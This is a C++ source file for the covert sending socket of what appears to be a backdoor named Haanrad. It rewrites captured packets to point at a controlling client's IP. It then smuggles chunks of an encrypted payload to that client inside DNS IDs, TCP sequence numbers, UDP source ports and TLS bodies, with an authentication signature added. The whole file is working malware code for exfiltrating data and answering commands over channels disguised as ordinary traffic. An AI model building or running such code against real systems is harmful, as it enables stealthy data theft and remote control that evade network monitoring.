//
// Created by bensoer on 31/10/16.
//

#include "CovertSocket.h"
#include "../../shared/utils/Logger.h"
#include "../SystemState.h"
#include "../../shared/utils/Structures.h"
#include "../../shared/Authenticator.h"
#include "../../shared/PacketIdentifier.h"

#include <cerrno>
#include <cstring>
#include <dnet.h>
#include <netinet/udp.h>
#include <malloc.h>
#include <netinet/tcp.h>

CovertSocket::CovertSocket(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, Time * time, string clientIP) {
    this->trafficAnalyzer = trafficAnalyzer;
    this->crypto = crypto;
    this->time = time;
    this->clientIP = clientIP;

    this->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
    int arg = 1;
    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
        Logger::debug("CovertSocket - SetSockOpt Failed For SO_REUSEADDR. Error: " + string(strerror(errno)));
    }

    //IP_HDRINCL to stop the kernel from building the packet headers
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
            Logger::debug("CovertSocket - SetSockOpt Failed For IP_HDRINCL. Error: " + string(strerror(errno)));
        }

    }
}

//covert socket send, does not need to know any context of where the request came from, Executor and FileSystemManager
//will generate the appropriate response for the request they receive. CovertSocket just plows them out
/**
 * send is the main sending method used by Haanrad for sending messages to the client. The passed in HAAN packet is parsed
 * into appropriate chunks depending on what packet type is selected and sent to the client. The method will hang until
 * all pieces of the HAAN packet has been parsed up and sent
 * @param payload String - the HAAN packet represented as a string to be parsed up and sent
 */
void CovertSocket::send(string payload) {

    //payload = {HAAN 00000000 data HAAN}\0

    if(SystemState::currentState == SystemState::STARTUP){
        Logger::debug("CovertSocket:send - STARTUP Mode Detected. Sending Last TrafficAnalyzer Packet To Client");
        //if were in startup we get the last one, otherwise its the best one
        PacketMeta meta = this->trafficAnalyzer->getLastPacketAdded();

        Logger::debug("CovertSocket:send - Parsing Contents For STARTUP Send");
        char * ptr = meta.packet;
        struct iphdr * ip = (struct iphdr *)ptr;
        ip->daddr = inet_addr(this->clientIP.c_str());
        ip->check = 0;
        ip->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));

        int iphdr_length = (ip->ihl * 4);
        //startup has to be udp since its DNS
        struct udphdr * udp = (struct udphdr *)(ptr + iphdr_length);

        Logger::debug("CovertSocket:send - Generating sockaddr_in for STARTUP Send");
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = udp->dest;
        sin.sin_addr.s_addr = inet_addr(this->clientIP.c_str());

        udp->check = 0;
        udp->uh_sum = 0;

        Logger::debug("CovertSocket:send - Sending Packet");
        ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
        if(result < 0){
            Logger::debug("CovertSocket - SendTo Failed. Error: " + string(strerror(errno)));
        }

    }else{
        string currentPayload = payload;

        while(currentPayload.length() > 0){

            //this->time->hangForTick();

            PacketMeta meta = this->trafficAnalyzer->getBestPacketToSend();

            if(meta.applicationType != ApplicationType::UNKNOWN){
                //application layer solution
                Logger::debug("CovertSocket:send - Packet Being Sent Is An Application Layer Packet");

                switch(meta.applicationType){
                    case ApplicationType::TLS:{
                        Logger::debug("CovertSocket:send - Packet Type Is TLS. Data Will Be Hidden Within A TLS Packet");
                        string password = Authenticator::getPassword();

                        string acceptablePortion;
                        string remainder;

                        unsigned long acceptableLength = (35 - password.length());
                        if(currentPayload.length() < acceptableLength){
                            acceptablePortion = currentPayload;
                            remainder = "";
                        }else{
                            acceptablePortion = currentPayload.substr(0, (35 - password.length()));
                            remainder = currentPayload.substr((35 - password.length()));
                        }

                        Logger::debug("CovertSocket:send- Acceptable Portion: >" + acceptablePortion + "<");
                        Logger::debug("CovertSocket:send - Remainder That Will Be Sent In Next Packet: >" + remainder + "<");

                        char * ptr = meta.packet;
                        struct iphdr * ip = (struct iphdr *)ptr;
                        ip->daddr = inet_addr(this->clientIP.c_str());

                        int iphdr_length = (ip->ihl * 4);
                        //startup has to be udp since its DNS
                        struct tcphdr * tcp = (struct tcphdr *)(ptr + iphdr_length);

                        struct sockaddr_in sin;
                        sin.sin_family = AF_INET;
                        sin.sin_port = tcp->dest;
                        sin.sin_addr.s_addr = inet_addr(this->clientIP.c_str());

                        tcp->check = 0;
                        tcp->th_sum = 0;

                        char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
                        if(applicationLayer == nullptr){
                            Logger::debug("CovertSocket:send - Unable To Find Application Layer For TLS Encryption. Can't Encrypt. Can't Send");
                            return;
                        }

                        //copy the payload into the TLS body
                        char * tlsPayload = (applicationLayer + sizeof(TLS_HEADER));
                        memcpy(tlsPayload, acceptablePortion.c_str(), acceptablePortion.size());
                        tlsPayload[acceptablePortion.length()] = '\0';

                        Authenticator::addAuthSignature(&meta);

                        this->crypto->encryptPacket(&meta, applicationLayer);

                        struct TLS_HEADER * tls = (struct TLS_HEADER *)applicationLayer;

                        ip->tot_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(struct TLS_HEADER) + ntohs(tls->length));

                        ip->check = 0;
                        ip->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));

                        Logger::debug("CovertSocket:send - Sending Packet");
                        ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
                        if(result < 0){
                            Logger::debug("CovertSocket - SendTo Failed. Error: " + string(strerror(errno)));
                        }

                        //update the payload
                        currentPayload = remainder;
                        //sendPacket(acceptablePortion);


                        break;
                    }
                    case ApplicationType::DNS:{
                        Logger::debug("CovertSocket:send - Packet Type is DNS. Payload will be hidden into a DNS packet");

                        //DNS size is 2 bytes - password is stored in the header so no calculations needed for that
                        string dnsPayload = "";
                        if(currentPayload.length() < 2){
                            dnsPayload = currentPayload;
                        }else{
                            dnsPayload = currentPayload.substr(0,2);
                        }

                        //add auth signature
                        Authenticator::addAuthSignature(&meta);
                        char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
                        if(applicationLayer == nullptr){
                            Logger::debug("CovertSocket:send - Unable To Find ApplicationLayer for DNS Packet. Can't Sent");
                            return;
                        }

                        //change destination address
                        char * ptr = meta.packet;
                        struct iphdr * ip = (struct iphdr *)ptr;
                        ip->daddr = inet_addr(this->clientIP.c_str());
                        ip->check = 0;
                        ip->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));

                        char * transportLayer = PacketIdentifier::findTransportLayer(&meta);
                        if(transportLayer == nullptr){
                            Logger::debug("CovertSocket:send - Unable To Find TransportLayer for DNS Packet. Can't Sent");
                            return;
                        }

                        //set dns payload
                        struct DNS_HEADER * dns = (struct DNS_HEADER *)applicationLayer;

                        char dnsID[2];
                        memcpy(&dnsID, &dns->id,2);

                        if(dnsPayload.length() < 2){
                            dnsID[0] = dnsPayload[0];
                            dnsID[1] = '\0';
                        }else{
                            dnsID[0] = dnsPayload[0];
                            dnsID[1] = dnsPayload[1];
                        }
                        memcpy(&dns->id, &dnsID, 2);

                        this->crypto->encryptPacket(&meta, applicationLayer);

                        //get udp and blank checksums for recalculation
                        struct udphdr * udp = (struct udphdr *)transportLayer;
                        udp->check = 0;
                        udp->uh_sum = 0;

                        //create sockaddr_in for sendto
                        struct sockaddr_in sin;
                        sin.sin_family = AF_INET;
                        sin.sin_port = udp->dest;
                        sin.sin_addr.s_addr = inet_addr(this->clientIP.c_str());

                        //send the packet
                        Logger::debug("CovertSocket:send - Sending Packet");
                        ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
                        if(result < 0){
                            Logger::debug("CovertSocket - SendTo Failed. Error: " + string(strerror(errno)));
                        }

                        //reset current payload
                        if(currentPayload.length() < 2){
                            currentPayload = "";
                        }else{
                            currentPayload = currentPayload.substr(2);
                        }
                        break;

                    }
                    default:{
                        Logger::debug("CovertSocket:send - Could Not Determine Application Layer Type For Packet. Can't Send");
                        return;
                    }
                }
            }else{
                //transport layer solution
                Logger::debug("CovertSocket:send - Packet Being Sent Is A Transport Layer Packet");

                switch(meta.transportType){
                    case TransportType::TCP:{
                        Logger::debug("CovertSocket:Send - Packet Is A TCP Packet. Payload Will Be Sent In TCP Packet");

                        string tcpPayload = "";
                        if(currentPayload.length() < 2){
                            tcpPayload = currentPayload;
                        }else{
                            tcpPayload = currentPayload.substr(0,2);
                        }

                        //add auth signature
                        Authenticator::addAuthSignature(&meta);

                        //change destination address
                        char * ptr = meta.packet;
                        struct iphdr * ip = (struct iphdr *)ptr;
                        ip->daddr = inet_addr(this->clientIP.c_str());
                        ip->check = 0;
                        ip->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));

                        char * transportLayer = PacketIdentifier::findTransportLayer(&meta);
                        if(transportLayer == nullptr){
                            Logger::debug("CovertSocket:send - Unable To Find TransportLayer for TCP Packet. Can't Sent");
                            return;
                        }

                        //get tcp and blank checksums for recalculation
                        struct tcphdr * tcp = (struct tcphdr *)transportLayer;
                        tcp->check = 0;
                        tcp->th_sum = 0;

                        //set tcp payload
                        char sequenceNumber[4];
                        memcpy(&sequenceNumber, &tcp->seq, 4);

                        if(tcpPayload.length() < 2){
                            sequenceNumber[2] = tcpPayload[0];
                            sequenceNumber[3] = '\0';
                        }else{
                            sequenceNumber[2] = tcpPayload[0];
                            sequenceNumber[3] = tcpPayload[1];
                        }

                        memcpy(&tcp->seq, &sequenceNumber, 4);

                        this->crypto->encryptPacket(&meta, PacketIdentifier::findApplicationLayer(&meta));

                        //create sockaddr_in for sendto
                        struct sockaddr_in sin;
                        sin.sin_family = AF_INET;
                        sin.sin_port = tcp->dest;
                        sin.sin_addr.s_addr = inet_addr(this->clientIP.c_str());

                        //send the packet
                        Logger::debug("CovertSocket:send - Sending Packet");
                        ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
                        if(result < 0){
                            Logger::debug("CovertSocket - SendTo Failed. Error: " + string(strerror(errno)));
                        }

                        if(currentPayload.length() < 2){
                            currentPayload = "";
                        }else{
                            currentPayload = currentPayload.substr(2);
                        }

                        break;

                    }
                    case TransportType::UDP:{

                        Logger::debug("CovertSocket:Send - Packet Is A UDP Packet. Payload Will Be Sent In UDP Packet");

                        string udpPayload = currentPayload.substr(0,1);

                        //add auth signature
                        Authenticator::addAuthSignature(&meta);

                        //change destination address
                        char * ptr = meta.packet;
                        struct iphdr * ip = (struct iphdr *)ptr;
                        ip->daddr = inet_addr(this->clientIP.c_str());
                        ip->check = 0;
                        ip->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));

                        char * transportLayer = PacketIdentifier::findTransportLayer(&meta);
                        if(transportLayer == nullptr){
                            Logger::debug("CovertSocket:send - Unable To Find TransportLayer for UDP Packet. Can't Send");
                            return;
                        }

                        int iphdr_length = (ip->ihl * 4);
                        struct udphdr * udp = (struct udphdr *)(ptr+ iphdr_length);

                        string udpSource1 = to_string(ntohs(udp->source));


                        //get tcp and blank checksums for recalculation
                        //struct udphdr * udp = (struct udphdr *)transportLayer;

                        //set tcp payload
                        char sourcePort[2];
                        memcpy(&sourcePort, &udp->source, 2);
                        sourcePort[1] = udpPayload[0];
                        memcpy(&udp->source, &sourcePort, 2);

                        string udpSource2 = to_string(ntohs(udp->source));

                        this->crypto->encryptPacket(&meta, PacketIdentifier::findApplicationLayer(&meta));

                        string udpSource3 = to_string(ntohs(udp->source));

                        //create sockaddr_in for sendto
                        struct sockaddr_in sin;
                        sin.sin_family = AF_INET;
                        sin.sin_port = udp->dest;
                        sin.sin_addr.s_addr = inet_addr(this->clientIP.c_str());

                        udp->check = 0;
                        udp->uh_sum = 0;

                        //send the packet
                        Logger::debug("CovertSocket:send - Sending Packet");
                        ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
                        if(result < 0){
                            Logger::debug("CovertSocket - SendTo Failed. Error: " + string(strerror(errno)));
                        }

                        currentPayload = currentPayload.substr(1);


                        break;

                    }
                    default:{
                        Logger::debug("CovertSocket:send - Could Not Determine Transort Type For Packet. Can't Send");
                        return;
                    }
                }

            }

        }



    }

}

/**
 * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
 * by the network stack
 * @param ptr
 * @param nbytes
 * @return
 */
unsigned short CovertSocket::csum (unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}